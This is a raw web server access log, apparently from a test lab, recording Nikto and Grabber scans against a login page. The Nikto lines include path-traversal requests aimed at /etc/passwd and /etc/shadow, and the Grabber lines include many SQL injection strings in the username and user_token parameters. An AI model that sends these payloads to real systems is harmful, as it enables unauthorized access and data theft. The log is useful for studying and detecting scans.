172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /.web.config.swp HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006512)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /nn.asp HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006513)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /munin/index.html HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006514)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /includes/conexion.inc HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006515)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /errorpage.aspx HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006516)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /spin/main.csp HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006517)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /openadmin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006518)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-admin/wp-login.php?action=register HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006519)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-login.php?action=register HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006520)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /../../windows/dvr2.ini HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006521)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /htdocs/../../../../../../../../../../../etc/passwd HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006522)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /?-s HTTP/1.1" 302 479 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006523)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /login.php?-s HTTP/1.1" 200 1992 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006524)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /manager/html HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006525)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /getstatus HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006526)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /platform/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006527)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /.svn/entries HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006528)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /.svn/wc.db HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006529)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /.git/index HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006530)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /.hg/dirstate HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006531)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /test.jsp HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006532)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /em HTTP/1.1" 404 493 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006533)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /oam/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006554)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /help/../../../../../../../../../../../../../../../../etc/shadow HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006555)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /snoop/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006556)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006557)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /otrs/installer.pl HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006558)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /reaction/RSTest.htm HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006559)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /bookmarks.nsfdeslo HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006560)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /deslog.nsf HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006561)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docdomguide.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006562)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docdspug.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006563)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /dochelp4.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006564)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /dochelpadmin.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006565)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /dochelplt4.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006566)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docinternet.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006567)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docjavapg.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006568)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /doclccon.nsf HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006569)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docmigrate.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006570)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docnpn_admn.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006571)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docnpn_rn.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006572)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docreadmec.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006573)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docreadmes.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006574)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docsmhelp.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006575)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /docsrvinst.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006576)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpdomguide.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006577)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpdspug.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006578)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helphelp4.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006579)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helphelpadmin.nsf HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006580)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helphelplt4.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006581)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpinternet.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006582)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpjavapg.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006583)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helplccon.nsf HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006584)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpmigrate.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006585)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpnpn_admn.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006586)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpnpn_rn.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006587)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpreadmec.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006588)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpreadmes.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006589)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpsmhelp.nsf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006590)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /helpsrvinst.nsf HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006591)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /iNotesForms5.nsf HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006592)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /quickplacequickplacemain.nsf HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006593)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /quickstartqstart50.nsf HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006594)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /quickstartwwsample.nsf HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006595)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /samplesiregw46.nsf HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006596)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /WorkArea/version.xml HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006597)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-content/debug.log HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006598)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /mobileadmin/db/MobileAdminDB.sqlite HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006599)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /mobileadmin/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006600)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /WorkArea/upload.aspx HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006601)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /WorkArea/Blogs/xmlrpc.aspx HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006602)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /mobileadmin/web/ HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006603)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /mobileadmin/logs/ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006605)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /mobileadmin/bin/ HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006606)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /mobileadmin/home.cs HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006607)"
172.17.0.1 - - [12/Feb/2019:08:21:24 +0000] "GET / HTTP/1.1" 302 442 "http://google.com/?q=you!" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=you!" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET / HTTP/1.1" 302 300 "http://google.com/?q=you!" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=you!" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET / HTTP/1.1" 302 300 "http://google.com/?q=you!" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=you!" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET / HTTP/1.1" 302 300 "http://google.com/?q=you!" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=you!" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1%27GRABBER_SQL_INJECTION HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1%27GRABBER_SQL_INJECTION HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=OR+1%3D1 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=OR+1%3D1 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%22OR+%221%22%3D%221 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%22OR+%221%22%3D%221 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%27%3B-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%27%3B-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?username=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=1%27GRABBER_SQL_INJECTION HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=1%27GRABBER_SQL_INJECTION HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=1%27+OR+1+OR+1%3D%27 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=OR+1%3D1 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=OR+1%3D1 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=%22OR+%221%22%3D%221 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=%22OR+%221%22%3D%221 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=%27%3B-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=%27%3B-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /?user_token=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+-- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:25 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
